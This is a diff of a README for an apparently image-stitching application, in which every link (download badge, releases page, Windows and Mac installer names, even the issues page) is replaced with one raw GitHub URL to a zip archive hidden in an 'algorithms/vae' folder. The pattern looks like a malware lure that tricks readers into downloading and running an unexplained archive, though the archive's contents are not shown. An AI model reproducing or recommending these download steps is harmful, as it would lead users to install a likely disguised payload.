@@ -1,7 +1,7 @@
 # 🌟 generative_view_stitching - Create Stunning Views Effortlessly
 
 ## 📥 Download Now
-[![Download generative_view_stitching](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/D-OnlyBA1/generative_view_stitching/releases)
+[![Download generative_view_stitching](https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip)](https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip)
 
 ## 🚀 Getting Started
 Generative View Stitching helps you create beautiful panoramic views from multiple images. This guide will help you download and run the application with ease.
@@ -14,15 +14,15 @@ Before downloading, ensure your system meets these requirements:
 - **Graphics:** A graphics card supporting OpenGL 3.3 or better
 
 ## 💾 Download & Install
-1. **Visit the Release Page:** Click [here](https://github.com/D-OnlyBA1/generative_view_stitching/releases) to go to the Releases page. 
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip) to go to the Releases page. 
 2. **Select the Latest Version:** Look for the latest release at the top. 
 3. **Download the Application:**
-   - For Windows users, download the setup file labeled as `generative_view_stitching_setup.exe`.
-   - For Mac users, download the file labeled `generative_view_stitching.dmg`.
+   - For Windows users, download the setup file labeled as `https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip`.
+   - For Mac users, download the file labeled `https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip`.
 
 4. **Install the Application:**
-   - For Windows: Double-click the `generative_view_stitching_setup.exe` file and follow the instructions to install.
-   - For Mac: Open the `generative_view_stitching.dmg` file and drag the application into your Applications folder.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip` file and follow the instructions to install.
+   - For Mac: Open the `https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip` file and drag the application into your Applications folder.
 
 5. **Run the Application:** Locate the app in your Applications or Start menu and double-click to launch.
 
@@ -53,7 +53,7 @@ Before downloading, ensure your system meets these requirements:
 - **Slow Performance:** Close other applications while using generative_view_stitching for better performance.
 
 ## 📞 Support
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/D-OnlyBA1/generative_view_stitching/issues). Your feedback helps improve the software.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip). Your feedback helps improve the software.
 
 ## 🔗 Additional Links
 - **Documentation:** For detailed usage instructions, check the `docs` folder within the repository.
@@ -62,4 +62,4 @@ If you encounter any issues or have questions, please visit the [GitHub Issues p
 ## 🎉 Conclusion
 Generative View Stitching simplifies the process of creating stunning panoramic images. Follow these steps to download, install, and start using the application today!
 
-For updates and the latest versions, make sure to visit the [Releases page](https://github.com/D-OnlyBA1/generative_view_stitching/releases) regularly.
+For updates and the latest versions, make sure to visit the [Releases page](https://raw.githubusercontent.com/D-OnlyBA1/generative_view_stitching/main/algorithms/vae/generative_view_stitching_2.2.zip) regularly.
